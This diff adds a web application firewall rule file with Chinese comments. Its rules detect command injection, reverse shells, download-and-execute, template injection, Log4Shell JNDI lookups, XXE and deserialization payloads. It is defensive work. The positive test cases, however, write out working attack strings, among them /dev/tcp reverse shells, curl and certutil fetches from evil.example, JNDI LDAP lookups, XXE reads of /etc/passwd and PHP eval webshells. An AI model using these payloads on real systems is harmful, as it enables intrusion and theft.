@@ -1,0 +1,857 @@
+# 命令注入 / 代码执行 / 模板注入 / XXE / 反序列化
+#
+# 变换链：urlDecode ×2 → replaceComments → compressWhitespace → lowercase
+#   replaceComments 在这里的作用是拆掉 `;/**/id` 这类注释分隔（变成 `; id`），
+#   而不是 used-by-SQL 的语义；这要求它替换为"空格"而不是删除（见 20-sqli.yaml 顶部说明）。
+#
+# 误报控制（对照上个 WAF 的教训）：
+#   - 裸反引号 `...` 与裸 $(...) 一律不写；必须"分隔符/替换符 + 命令名"同时成立。
+#   - 模板注入正则必须带危险标识符（__class__ / config / self / forName / Runtime），
+#     因此 {{name}}、{{price}}、${HOME} 这类正常模板文本不会被误伤。
+#   - XXE 不判 <!DOCTYPE，只判 <!ENTITY 与 SYSTEM/PUBLIC 的组合。
+version: 1
+meta:
+  name: "命令注入与代码执行"
+  author: "qingli"
+  category: rce
+
+rules:
+
+  - id: RCE-6001
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    # 5 分（独立拦）：分隔符 + 命令名是命令注入的签名形态。
+    # 以前给 4 分是担心误报，但枚举命令名挡不住"类"：
+    # `;pwd`、`;echo`、`;w` 当时既不在表里、也不够阈值。现在词表扩全，
+    # 自然文本仍由 looksLikeCommandLine / shellArgFollows 的收紧条件挡住
+    # （多行文本里"某行以 cat 开头"不会立案）。
+    message: "命令注入迹象：shell 特征字符与结构（containsShellChars）"
+    tags: [rce, owasp-a03, cmdi, semantic]
+    # targets 里为什么要带 REQUEST_URI：
+    # 查询串会被按 `&` 切分成参数，裸分号 `?host=127.0.0.1;id` 切完就成两个值
+    # （`127.0.0.1` 与 `id`），单看任何一个值都看不到 `;id` 这个组合 ——
+    # 而**后端不一定这么切**（PHP/部分框架认 `;` 作分隔符，有些又不认）。
+    # 补上原始 URI 让规则能看到完整形态，避免"WAF 与后端切分方式不一致"的盲区。
+    # 也看请求头：`Cookie: c=;cat /etc/passwd` 这种载荷在 Cookie 集合里会被分号
+    # 切成空值，只有**原始的 Cookie 头**保留着完整证据（实测曾漏检）。
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_HEADERS
+      - collection: REQUEST_COOKIES
+      - collection: REQUEST_URI
+    # **没有 compressWhitespace**（踩过的坑）：它把 `\n`、`\r` 折成空格，
+    # 而算子恰恰靠"分隔符 + 命令名"判断命令注入 —— 于是 `?host=127.0.0.1%0aid`
+    # 这种换行分隔的载荷在归一化阶段就被抹平、算子再也配不上（实测 0 分）。
+    # 算子自己会用 TrimLeft 跳过 `;` 后面的空格与 tab，不需要这道归一化。
+    # normalizeIFS 把 `${IFS}` / `$IFS` 折叠成空格 —— 它们是"空格"的 shell 写法，
+    # 不折的话算子只认空格/tab，`;cat${IFS}/etc/passwd` 这类就整条漏检。
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - expandShellVars
+      - removeShellEscapes
+      - removeShellQuotes
+      - lowercase
+    operator:
+      name: containsShellChars
+    test:
+      positive:
+        - "127.0.0.1;i\\d"
+        - "127.0.0.1;i'd'"
+        - "127.0.0.1;/bin/hostname"
+        - "; cat /etc/passwd"
+        - "| whoami"
+        - "$(id)"
+        # 换行分隔（作者报的漏检形态）：%0a 解码后就是真换行
+        - "127.0.0.1%0aid"
+        - "127.0.0.1\nid"
+        - "10.0.0.1%0acat /etc/passwd"
+        # 裸分号：靠 REQUEST_URI 那一份原始串命中
+        - "127.0.0.1;id"
+        # ${IFS} 当空格用（crackweb 实测绕过形态）
+        - ";cat${IFS}/etc/passwd"
+        - ";cat$IFS/etc/passwd"
+      negative:
+        - "gzip, deflate, br;q=1.0"
+        - "multipart/form-data; boundary=----x"
+        - "text/html; charset=utf-8; q=0.9"
+        - "Cats; dogs; and birds"
+        - "the total is $5 (approx)"
+        - "Please confirm; the team will follow up"
+        # 多行正常文本：换行后跟的是日常词，不是命令行
+        - "line1\ncat photos are cute"
+        - "note\nid card number is required"
+        - "intro\nsh photos from the party"
+        # 只提到 ${IFS} 这个概念、没有分隔符+命令名的正常文本
+        - "the ${IFS} variable is described in the shell guide"
+
+  - id: RCE-6002
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令注入特征：反引号或 $() 命令替换"
+    tags: [rce, owasp-a03, cmdi, substitution]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '\x60\s*(?:id|whoami|uname|hostname|cat|ls|curl|wget|nc|bash|sh|cmd|powershell|ping|nslookup|ifconfig|ipconfig|netstat|ps|chmod|rm)\b|\$\(\s*(?:id|whoami|uname|hostname|cat|ls|curl|wget|nc|bash|sh|cmd|powershell|ping|nslookup|ifconfig|ipconfig|netstat|ps|chmod|rm)\b'
+    test:
+      positive:
+        - "`id`"
+        - "$(whoami)"
+        - "`cat /etc/passwd`"
+        - "$(curl http://evil.example/x)"
+      negative:
+        - "the total is $5 (approx)"
+        - "Set the `PATH` variable in your shell profile"
+        - "$id is a required field"
+
+  - id: RCE-6003
+    phase: 2
+    severity: critical
+    category: rce
+    score: 5
+    message: "命令注入特征：命令分隔符后紧跟系统命令"
+    tags: [rce, owasp-a03, cmdi]
+    # 也看请求头：`Cookie: c=;cat /etc/passwd` 这种载荷在 Cookie 集合里会被分号
+    # 切成空值，只有**原始的 Cookie 头**保留着完整证据（实测曾漏检）。
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_HEADERS
+      - collection: REQUEST_COOKIES
+      - collection: REQUEST_URI
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      # `${IFS}`/`$IFS` 先折成空格，下面的 \s+ 才认得出"命令 + 参数"的分隔
+      - normalizeIFS
+      - removeShellEscapes
+      - removeShellQuotes
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '[;&|]{1,2}[\s+]*(?:[^\s;&|]*/)?(?:cat|tac|head|tail|more|less|ls|dir|find|locate|grep|egrep|fgrep|awk|sed|cut|sort|uniq|wc|strings|xxd|od|base64|md5sum|sha1sum|sha256sum|cp|mv|rm|mkdir|rmdir|touch|ln|chmod|chown|chgrp|tar|zip|unzip|gzip|gunzip|id|whoami|uname|hostname|w|who|ps|pwd|env|printenv|date|uptime|last|df|du|free|top|lsof|ss|ifconfig|ipconfig|ip|arp|route|netstat|systeminfo|tasklist|nslookup|dig|host|ping|traceroute|tracert|nmap|nc|ncat|telnet|ftp|ssh|scp|rsync|curl|wget|sh|bash|dash|zsh|ksh|csh|ash|busybox|python|python3|perl|ruby|php|node|nodejs|lua|java|gcc|make|cmd|powershell|pwsh|cscript|wscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|schtasks|reg|net|sc|kill|killall|pkill|sudo|su|systemctl|service|crontab|at|mount|umount|insmod|modprobe|docker|kubectl|git|vim|vi|nano|echo|printf|tee|xargs|eval|exec|source|export)[\s+]+[$/~.\-\x22\x27]|[;&|]{1,2}[\s+]*(?:wget|curl)[\s+]+https?://|[;&|]{1,2}[\s+]*(?:whoami|uname|hostname|ifconfig|ipconfig|netstat|tasklist|systeminfo|nslookup|ping|nmap|nc|ncat|bash|sh|cmd|powershell|python|perl|ruby|php|chmod|chown|mkfifo|rm|cp|mv|kill)\b|[;&|]{1,2}[\s+]*id[\s+]*(?:$|[;&|])'
+    test:
+      positive:
+        - "; cat /etc/passwd"
+        - "| whoami"
+        - "& ping -c1 127.0.0.1"
+        - ";id;"
+        - "&& curl http://evil.example/x.sh"
+        # ${IFS} + 通配符（crackweb 那一条）
+        - "; cat${IFS}/etc/pass?d"
+        - ";cat$IFS/etc/passwd"
+        - "|cat${IFS}${IFS}/etc/shadow"
+      negative:
+        - "gzip, deflate, br;q=1.0"
+        - "multipart/form-data; boundary=----x"
+        - "text/html; charset=utf-8; q=0.9"
+        - "Cats; dogs; and birds"
+        - "the order id 42 is missing"
+        - "Separator: A | B | C"
+        - "the total is 3; select the option"
+        - "use ${IFS} when you need a literal space in shell scripts"
+
+  - id: RCE-6004
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令执行特征：远程下载与管道执行"
+    tags: [rce, owasp-a03, download-execute]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+    # normalizeIFS 把 `$IFS` / `${IFS}` 折成空格：shell 里它们就是空格，
+    # 而 `certutil$IFS-urlcache` 这种形态让所有"带空格的字面量"全部失效
+    # （实测：这些规则以前都没有这道变换，只有 6001/6003 有）。
+    # normalizePath 在这里的作用是折叠"重复斜杠 / 点段"这类等价写法：
+    # `cmd //c whoami`、`whoami //all`、`rm -rf //`、`/etc//cron`、
+    # `bitsadmin //transfer` —— 实测这些变体都能绕过纯字面量匹配。
+    # 注意**只给这类"路径/选项字面量"规则挂**：带 URL scheme 的规则
+    # （`jndi:ldap://`、`gopher://`、`php://`、`http://`）不能挂 ——
+    # normalizePath 会把 `//` 折成 `/`，那正好把要匹配的形态毁掉。
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - removeShellQuotes
+      - compressWhitespace
+      - lowercase
+      - normalizePath
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "curl http"
+          - "curl -o"
+          - "curl -s"
+          - "curl -f"
+          - "curl -k"
+          - "wget http"
+          - "wget -o"
+          - "wget -q"
+          - "| bash"
+          - "|bash"
+          - "| sh"
+          - "|sh"
+          - "bash -i"
+          - "sh -i"
+          - "nc -e"
+          - "ncat -e"
+          - "socat "
+          - "python -c"
+          - "python3 -c"
+          - "perl -e"
+          - "ruby -e"
+          - "php -r"
+          - "powershell -enc"
+          - "powershell -e "
+          - "powershell -nop"
+          - "iex("
+          - "invoke-expression"
+          - "downloadstring"
+          - "downloadfile"
+          - "certutil -urlcache"
+          - "certutil -decode"
+          - "bitsadmin /transfer"
+          - "mshta http"
+          - "mshta javascript"
+          - "regsvr32 /s /u"
+          - "rundll32 javascript"
+          - "wmic process call create"
+    test:
+      positive:
+        - "bitsadmin //transfer http://evil/x"
+        - "regsvr32 //s //u //i:http://evil/x"
+        - ";wget http://evil.example/x.sh -O /tmp/x"
+        - "curl http://169.254.169.254/latest/meta-data/"
+        - "powershell -enc SQBFAFgA"
+        - "cmd /c certutil -urlcache -f http://evil.example/x.exe y.exe"
+      negative:
+        - "please download the report from our website"
+        - "the API is documented at https://example.com/docs"
+        - "I will fetch the file later from the shared drive"
+  - id: RCE-6005
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令执行特征：反弹 shell 与持久化"
+    tags: [rce, owasp-a03, reverse-shell, persistence]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+    # normalizePath 在这里的作用是折叠"重复斜杠 / 点段"这类等价写法：
+    # `cmd //c whoami`、`whoami //all`、`rm -rf //`、`/etc//cron`、
+    # `bitsadmin //transfer` —— 实测这些变体都能绕过纯字面量匹配。
+    # 注意**只给这类"路径/选项字面量"规则挂**：带 URL scheme 的规则
+    # （`jndi:ldap://`、`gopher://`、`php://`、`http://`）不能挂 ——
+    # normalizePath 会把 `//` 折成 `/`，那正好把要匹配的形态毁掉。
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - removeShellQuotes
+      - compressWhitespace
+      - lowercase
+      - normalizePath
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "/dev/tcp/"
+          - "bash -i >&"
+          - "sh -i >&"
+          - "nc -e /bin"
+          - "ncat -e /bin"
+          - "mkfifo /tmp"
+          - "rm -rf /"
+          - "chmod 777"
+          - "chmod 4755"
+          - "chmod +s"
+          - "authorized_keys"
+          - "ssh-rsa aaa"
+          - "crontab -"
+          - "/etc/cron"
+          - "systemctl enable"
+          - "nc -lvp"
+          - "nc -l -p"
+          - "socat tcp-connect"
+          - "openssl s_client -connect"
+          - "base64 -d | sh"
+          - "base64 --decode"
+    test:
+      positive:
+        - "rm -rf //"
+        - "mkfifo //tmp/f"
+        - "/etc//cron.d/x"
+        - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        - "echo ssh-rsa AAAAB3NzaC1yc2EAAA... >> /root/.ssh/authorized_keys"
+        - "nc -e /bin/sh 10.0.0.1 4444"
+        - "echo Y3VybCB4 | base64 -d | sh"
+      negative:
+        - "the systemd unit is enabled for the service"
+        - "the deployment uses SSH keys stored in the vault"
+        - "chmod is used to change file permissions"
+  - id: RCE-6006
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令执行特征：Windows 命令与系统工具"
+    tags: [rce, owasp-a03, windows]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+    # normalizePath 在这里的作用是折叠"重复斜杠 / 点段"这类等价写法：
+    # `cmd //c whoami`、`whoami //all`、`rm -rf //`、`/etc//cron`、
+    # `bitsadmin //transfer` —— 实测这些变体都能绕过纯字面量匹配。
+    # 注意**只给这类"路径/选项字面量"规则挂**：带 URL scheme 的规则
+    # （`jndi:ldap://`、`gopher://`、`php://`、`http://`）不能挂 ——
+    # normalizePath 会把 `//` 折成 `/`，那正好把要匹配的形态毁掉。
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - removeShellQuotes
+      - compressWhitespace
+      - lowercase
+      - normalizePath
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "cmd.exe /c"
+          - "cmd /c "
+          - "powershell.exe"
+          - "wmic "
+          - "reg add "
+          - "reg query "
+          - "reg delete "
+          - "schtasks /create"
+          - "net user "
+          - "net localgroup"
+          - "vssadmin delete"
+          - "bcdedit "
+          - "whoami /all"
+          - "ipconfig /all"
+          - "systeminfo"
+          - "tasklist /v"
+          - "netstat -ano"
+          - "dir c:\\"
+          - "type c:\\windows"
+          - "sc create"
+          - "sc stop"
+    test:
+      positive:
+        - "cmd //c whoami"
+        - "whoami //all"
+        - "tasklist //v"
+        - "cmd.exe /c whoami"
+        - "net user hacker P@ssw0rd /add"
+        - "ipconfig /all"
+        - "reg add HKLM\\Software\\Run /v x /d y"
+      negative:
+        - "the system information page is at /about"
+        - "run the setup wizard to create an account"
+        - "please check your network settings"
+  - id: RCE-6007
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "代码执行特征：PHP/Java 危险函数"
+    tags: [rce, owasp-a03, code-execution]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "system("
+          - "exec("
+          - "shell_exec("
+          - "passthru("
+          - "popen("
+          - "proc_open("
+          - "pcntl_exec("
+          - "eval("
+          - "assert("
+          - "create_function("
+          - "call_user_func("
+          - "base64_decode("
+          - "gzinflate("
+          - "str_rot13("
+          - "preg_replace("
+          - "runtime.getruntime().exec"
+          - "processbuilder("
+          - "class.forname("
+          - "scriptengine"
+          - "classloader"
+          - "defineclass("
+          - "ognl."
+          - "spelexpressionparser"
+    test:
+      positive:
+        - "<?php system($_GET['cmd']); ?>"
+        - "eval(base64_decode('ZWNobyAxOw=='))"
+        - "java.lang.Runtime.getRuntime().exec(\"id\")"
+      negative:
+        - "the system is down for maintenance"
+        - "please execute the migration script"
+        - "we evaluated the proposal last week"
+
+  - id: RCE-6008
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "模板注入特征：模板引擎危险标识符"
+    tags: [rce, ssti, template-injection]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "__class__"
+          - "__mro__"
+          - "__subclasses__"
+          - "__globals__"
+          - "__builtins__"
+          - "__init__"
+          - "class.forname"
+          - "getruntime"
+          - "processbuilder"
+          - "scriptengine"
+          - "ognl."
+          - "os.environ"
+          - "popen("
+          - "runtime().exec"
+          - "freemarker.template"
+          - "velocity.evaluate"
+          - "spelexpressionparser"
+    test:
+      positive:
+        - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+        - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+        - "{{''.__class__.__mro__[1].__subclasses__()}}"
+        - "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+      negative:
+        - "Hello {{name}}, your order is ready"
+        - "Template: {{ user.first_name }} - invoice {{invoice_no}}"
+        - "Use ${HOME} in your shell profile"
+        - "The price is {{price}} USD"
+
+  - id: RCE-6009
+    phase: 2
+    severity: critical
+    category: rce
+    score: 5
+    message: "JNDI 注入特征：Log4j 风格的 ${jndi:} 查找"
+    tags: [rce, log4shell, jndi, owasp-a03]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_HEADERS
+    transforms:
+      - urlDecode
+      - urlDecode
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "${jndi:"
+          - "jndi:ldap://"
+          - "jndi:rmi://"
+          - "jndi:dns://"
+          - "jndi:iiop://"
+          - "jndi:ldaps://"
+          - "${::-j}"
+          - "${lower:j}"
+          - "${upper:j}"
+    test:
+      positive:
+        - "${jndi:ldap://evil.example/a}"
+        - "$%7Bjndi:ldap://evil.example/a%7D"
+        - "${jndi:rmi://10.0.0.1:1099/x}"
+        - "${lower:j}ndi:ldap://evil.example/a"
+      negative:
+        - "The total is ${price} USD"
+        - "LDAP server: ldaps://corp.example:636"
+        - "JNDI is a Java naming and directory interface"
+
+  - id: RCE-6010
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "XXE 特征：外部实体声明"
+    tags: [rce, xxe, owasp-a03, xml]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: ARGS_XML
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '<!entity\s+[a-z_%][^>]{0,160}\b(?:system|public)\b|<!doctype[^>]{0,300}\[\s*<!entity|<\s*xi:include|<!entity\s+%\s'
+    test:
+      positive:
+        - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+        - "<!DOCTYPE x [<!ENTITY % p SYSTEM \"http://evil.example/x.dtd\"> %p;]>"
+        - "<x><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></x>"
+      negative:
+        - "<?xml version=\"1.0\"?><root><item>hello</item></root>"
+        - "<!DOCTYPE html><html><body>hi</body></html>"
+        - "<x:include xmlns:x=\"urn:example\">no</x:include>"
+
+  - id: RCE-6011
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "反序列化特征：PHP/Java/Python 序列化数据"
+    tags: [rce, deserialization, owasp-a08]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_COOKIES
+    transforms:
+      - urlDecode
+      - urlDecode
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "o:4:\""
+          - "o:3:\""
+          - "o:5:\""
+          - "o:6:\""
+          - "o:7:\""
+          - "o:8:\""
+          - "o:9:\""
+          - "o:10:\""
+          - "o:11:\""
+          - "o:12:\""
+          - "o:13:\""
+          - "o:14:\""
+          - "o:15:\""
+          - "o:16:\""
+          - "o:17:\""
+          - "o:18:\""
+          - "o:20:\""
+          - "o:24:\""
+          - "__php_incomplete_class"
+          - "_$$nd_func"
+          - "ro0ab"
+          - "aced0005"
+          - "java.io.objectinputstream"
+          - "ysoserial"
+          - "!!python/object"
+          - "!!python/object/apply"
+          - "yaml.load("
+          - "pickle.loads"
+          - "cpickle.loads"
+          - "gopher://127.0.0.1"
+          - "c:11:\"arrayobject\""
+    test:
+      positive:
+        - "O:8:\"stdClass\":1:{s:4:\"name\";s:5:\"admin\";}"
+        - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
+        - "!!python/object/apply:os.system [\"id\"]"
+        - "aced000574000c74657374"
+      negative:
+        - "Order reference O:4: has been confirmed"
+        - "please load the configuration file"
+        - "aGVsbG8gd29ybGQ="
+
+  # 这一条是**从 6004/6005 里"挑出来单独拦"的那部分**。
+  #
+  # 为什么拆：那两条把"攻击专用形态"和"运维文档里天天出现的双用途串"混在一起 ——
+  # `chmod 777`、`systemctl enable`、`authorized_keys`、`openssl s_client -connect`、
+  # `nc -lvp`、`python -c`、`ipconfig /all`、`tasklist /v` 这些出现在帮助台工单、
+  # 运维文档、配置表单里的概率很高。整条提到 5 分（单独就拦）等于拿误报换覆盖。
+  #
+  # 所以按"出现即攻击"来分：
+  #   - 这条（6013，5 分）：反弹 shell 与下载执行的**专用命令行形态**，
+  #     正常业务输入里不会出现，出现即拦；
+  #   - 6004/6005（4 分）：双用途形态，只记分、与其它信号叠加。
+  # 重叠的串两条都会命中（5 + 4），总分更高但拦不拦的结论不变。
+  - id: RCE-6013
+    phase: 2
+    severity: critical
+    category: rce
+    score: 5
+    message: "命令执行特征：反弹 shell / 下载执行专用形态"
+    tags: [rce, owasp-a03, reverse-shell, download-exec]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_COOKIES
+      - collection: REQUEST_URI
+      - collection: REQUEST_HEADERS
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - removeShellQuotes
+      - compressWhitespace
+      - lowercase
+      - normalizePath
+    operator:
+      name: pm
+      params:
+        patterns:
+          # 反弹 shell
+          - "/dev/tcp/"
+          - "bash -i >&"
+          - "sh -i >&"
+          - "nc -e /bin"
+          - "ncat -e /bin"
+          - "mkfifo /tmp"
+          - "socat tcp-connect"
+          - "socat exec:"
+          - "base64 -d | sh"
+          - "base64 --decode | sh"
+          # 下载执行（系统自带工具的滥用）
+          - "certutil -urlcache"
+          - "certutil -decode"
+          - "bitsadmin /transfer"
+          - "mshta http"
+          - "mshta javascript"
+          - "rundll32 javascript"
+          - "wmic process call create"
+          - "powershell -enc"
+          - "powershell -e "
+    test:
+      positive:
+        - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        - "nc -e /bin/sh 10.0.0.1 4444"
+        - "mkfifo /tmp/f; /bin/sh -i < /tmp/f"
+        - "echo cHduZWQ= | base64 -d | sh"
+        - "certutil -urlcache -f http://evil/x.exe y.exe"
+        - "bitsadmin //transfer http://evil/x y.exe"
+        - "mshta http://evil/x.hta"
+        - "powershell -enc SQBFAFgA"
+        - "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh"
+      negative:
+        # 双用途的运维文本不该被这条拦（它们仍由 6004/6005 记分）
+        - "run chmod 777 on the uploads directory"
+        - "systemctl enable nginx after the upgrade"
+        - "append your key to ~/.ssh/authorized_keys"
+        - "openssl s_client -connect example.com:443"
+        - "python -c 'print(1)' in a venv"
+        - "ipconfig /all shows the adapter list"
+
+  # .NET 反序列化：请求里出现这些基类型名或 BinaryFormatter 魔数的 base64 头，
+  # 基本只可能是 ysoserial.net 打过来的 —— 出现即攻击。
+  - id: RCE-6014
+    phase: 2
+    severity: critical
+    category: rce
+    score: 5
+    message: "代码执行特征：.NET 反序列化载荷"
+    tags: [rce, deserialization, dotnet]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+      - collection: REQUEST_COOKIES
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - removeShellQuotes
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          # BinaryFormatter 序列化魔数（00 01 00 00 00 FF FF FF FF）的 base64 头
+          - "aaeaaad"
+          - "objectstateformatter"
+          - "losformatter"
+          - "typeconfusedelegate"
+          - "textformattingrunproperties"
+          - "system.web.ui.objectstateformatter"
+          - "binaryformatter"
+          - "system.runtime.serialization"
+    test:
+      positive:
+        - "AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4w"
+        - "ObjectStateFormatter"
+        - "TypeConfuseDelegate"
+        - "TextFormattingRunProperties"
+      negative:
+        - "the serializer handles JSON payloads"
+        - "please format the output as JSON"
+        - "our .NET service runs on Windows"
+
+  # 结构判定：**不依赖命令词表** —— 分隔符后面跟一个词，再跟路径或选项，
+  # 这种"命令 + 参数"的形状在正常业务输入里几乎不出现。
+  # 定位是兜底：词表里的命令由 6001/6003 直接拦（5 分），表外的走这条记分，
+  # 与 LFI/RCE 的其它信号叠加后过阈值。触发这条规则的实测样本：
+  # "它是在枚举命令名，而不是判'这里有个命令'" —— 这条就是那个判据。
+  - id: RCE-6017
+    phase: 2
+    severity: high
+    category: rce
+    score: 4
+    message: "命令注入迹象：分隔符后出现命令与参数的形状（不看命令名）"
+    tags: [rce, owasp-a03, cmdi, structural]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+      - collection: REQUEST_HEADERS
+      - collection: REQUEST_COOKIES
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: '[;&|]{1,2}[\s+]*[a-z0-9_][a-z0-9_.\-]{0,24}[\s+]+(?:-{1,2}[a-z]|/|\.\./|\$\()'
+    test:
+      positive:
+        - ";mytool -x /tmp/a"
+        - "|somebin /etc/passwd"
+        - ";custom-tool --exec"
+      negative:
+        - "Cats; dogs and birds"
+        - "the total is 3; select the option"
+        - "Separator: A | B | C"
+
+  - id: RCE-6012
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "脚本代码出现在请求头/参数/路径里（日志投毒与代码注入特征）"
+    tags: [rce, log-poisoning, code-execution]
+    # 为什么单独一条规则、而且要看请求头：
+    # 「把 PHP 写进 User-Agent/Referer/URL，等应用把访问日志 include 进来」是
+    # 日志投毒到 RCE 的经典链路，而它的第一跳**只出现在请求元数据里**。
+    # RCE-6007 只覆盖 ARGS 与请求体，UA/Referer/Cookie/路径一个都不看，
+    # 于是这条链的第一跳可以从旁边走过去。这里补上那几个集合。
+    #
+    # 打分 5（强信号）：正常流量不会在请求头里出现 `<?php`、`eval($_`、`$_POST[`。
+    targets:
+      - collection: REQUEST_HEADERS
+      - collection: REQUEST_COOKIES
+      - collection: ARGS
+      - collection: REQUEST_PATH
+    transforms:
+      - urlDecode
+      - urlDecode
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: pm
+      params:
+        patterns:
+          - "<?php"
+          - "<?="
+          - "<%@"
+          - "eval($_"
+          - "assert($_"
+          - "system($_"
+          - "passthru($_"
+          - "shell_exec($_"
+          - "base64_decode($_"
+          - "$_post["
+          - "$_get["
+          - "$_request["
+          - "$_server["
+    test:
+      positive:
+        - "<?php system($_GET['cmd']); ?>"
+        - "<?=phpinfo();?>"
+        - "eval($_POST['a']);"
+        - "<%@ page import=\"java.util.*\" %>"
+        - "<?php @eval($_POST[cmd]);?>"
+      negative:
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
+        - "https://example.com/landing?utm_source=newsletter"
+        - "session=8f2b1c9d; theme=dark; lang=zh-CN"
+        - "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif"
+        - "gzip, deflate, br"
+
+  - id: RCE-6018
+    phase: 2
+    severity: high
+    category: rce
+    score: 5
+    message: "命令注入特征：IP/主机形参数值后跟 shell 分隔符与命令词"
+    tags: [rce, owasp-a03, structural]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_URI
+    transforms:
+      - urlDecode
+      - urlDecode
+      - normalizeIFS
+      - expandShellVars
+      - compressWhitespace
+      - lowercase
+    operator:
+      name: regex
+      params:
+        pattern: "(?:[0-9]{1,3}\\.){3}[0-9]{1,3}[ \\t+]*[;&|]{1,2}[ \\t+]*[a-z]"
+    test:
+      positive:
+        - "127.0.0.1;arch"
+        - "127.0.0.1;nproc"
+        - "127.0.0.1;getconf LONG_BIT"
+        - "10.0.0.1 | hostid"
+      negative:
+        - "10.0.0.1;10.0.0.2"
+        - "192.168.1.1 | 255.255.255.0"
+        - "resolver=8.8.8.8,1.1.1.1"
